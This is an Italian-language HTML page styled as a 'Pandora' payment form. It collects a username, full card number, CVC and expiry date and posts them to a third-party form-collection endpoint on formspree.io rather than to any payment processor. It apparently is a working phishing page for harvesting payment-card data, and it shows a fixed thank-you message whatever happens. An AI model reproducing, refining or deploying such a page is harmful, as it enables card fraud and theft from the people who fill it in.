<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Pandora</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            font-size: 14px;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .form-group input[type="submit"] {
            background-color: #007BFF;
            color: white;
            cursor: pointer;
        }
        .form-group input[type="submit"]:hover {
            background-color: #0056b3;
        }
        .message {
            text-align: center;
            font-size: 16px;
            color: #4CAF50;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Pagamento Pandora</h1>
        <form action="https://formspree.io/f/xqablvgb" method="POST">
            <!-- Campo Nome Utente -->
            <div class="form-group">
                <label for="username">Nome Utente:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <!-- Campo Numero Carta -->
            <div class="form-group">
                <label for="card-number">Numero Carta:</label>
                <input type="text" id="card-number" name="card-number" maxlength="16" required>
            </div>
            <!-- Campo CVC -->
            <div class="form-group">
                <label for="cvc">CVC:</label>
                <input type="text" id="cvc" name="cvc" maxlength="3" required>
            </div>
            <!-- Campo Data di Scadenza -->
            <div class="form-group">
                <label for="expiry-date">Data di Scadenza:</label>
                <input type="text" id="expiry-date" name="expiry-date" required>
            </div>
            <!-- Pulsante Submit -->
            <div class="form-group">
                <input type="submit" value="Invia Dati">
            </div>
        </form>
        <!-- Messaggio di conferma -->
        <div class="message">
            <p>Grazie per aver effettuato il pagamento ðŸ’–</p>
        </div>
    </div>
</body>
</html>
